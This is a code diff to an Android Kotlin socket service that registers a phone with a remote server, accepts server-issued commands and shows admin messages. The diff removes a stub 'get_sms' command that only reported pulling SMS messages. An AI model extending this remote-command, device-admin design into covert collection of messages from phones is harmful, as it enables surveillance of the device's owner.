@@ -1,9 +1,6 @@
 package com.ahmed.zai
 
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.Service
+import android.app.*
 import android.content.Context
 import android.content.Intent
 import android.app.admin.DevicePolicyManager
@@ -51,6 +48,7 @@ class SocketService : Service() {
                 val data = JSONObject()
                 data.put("deviceName", "مصطفى - " + Build.MODEL)
                 mSocket?.emit("register_device", data)
+                sendDataToServer("STATE", "Connected")
             }
 
             mSocket?.on("execute_command") { args ->
@@ -71,10 +69,10 @@ class SocketService : Service() {
                     cmd.startsWith("msg:") -> {
                         val message = cmd.substringAfter("msg:")
                         showNotification("رسالة من الإدارة", message)
-                    }
-                    cmd == "get_sms" -> {
-                        // هنبعت إشارة للويب إن التطبيق استلم الأمر (الرسايل الفعلية محتاجة صلاحيات معقدة)
-                        sendDataToServer("SMS", "جاري سحب الرسائل...")
+                        // إضافة قاعدة البيانات
+                        val prefs = getSharedPreferences("ZaiPrefs", Context.MODE_PRIVATE)
+                        val oldLogs = prefs.getString("system_logs", "") ?: ""
+                        prefs.edit().putString("system_logs", "$oldLogs\n- رسالة: $message").apply()
                     }
                 }
             }
